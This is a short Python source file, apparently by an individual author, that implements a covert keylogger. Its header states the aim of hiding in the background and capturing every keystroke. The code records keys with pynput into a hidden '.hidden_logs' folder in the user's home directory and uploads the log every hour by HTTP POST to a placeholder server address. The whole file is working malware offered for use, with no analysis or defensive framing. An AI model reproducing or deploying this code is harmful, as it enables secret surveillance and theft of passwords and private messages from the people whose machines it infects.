#Author: Omri Yaakov
#Purpose: App that is hidden in the background and capture every key stroke from the user to a txt file, And every hour send it to the server.

import os
import sys
import logging
try:
    import requests
except ImportError:
    print("The 'requests' module is not installed. Install it using 'pip install requests'.")
    sys.exit(1) 
from pynput import keyboard
from threading import Timer
from datetime import datetime

# Directory to store logs (hidden directory in the user's home directory)
log_dir = os.path.join(os.path.expanduser("~"), ".hidden_logs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file = os.path.join(log_dir, "keylog.txt")

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logging.info(" ")
        else:
            logging.info(f'[{key}]')

# Start and stop the listener
def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run the listener in the background
def run_background():
    Timer(0, start_listener).start()

# Function to send the log file via HTTP POST
def send_log_file():
    url = 'http://your-server-ip:5000/upload'
    files = {'file': open(log_file, 'rb')}
    response = requests.post(url, files=files)
    print(response.text)

# Timer to send the log file periodically (e.g., every hour)
def upload_timer():
    send_log_file()
    Timer(3600, upload_timer).start()

if __name__ == "__main__":
    run_background()
    upload_timer()
